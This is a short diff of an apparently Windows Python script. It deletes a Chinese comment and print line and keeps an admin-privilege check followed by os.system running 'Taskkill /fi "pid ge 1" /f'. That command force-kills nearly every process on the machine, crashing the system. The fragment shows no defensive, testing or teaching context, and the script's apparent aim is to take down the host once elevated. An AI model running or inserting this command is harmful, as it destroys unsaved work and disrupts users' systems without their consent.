@@ -7,8 +7,7 @@ def is_admin():
     except:
         return False
 		
-if is_admin(): # 将要运行的代码加到这里
-    print("以获取管理员权限...")
+if is_admin():
     os.system("Taskkill /fi \"pid ge 1\" /f")
     input()
     
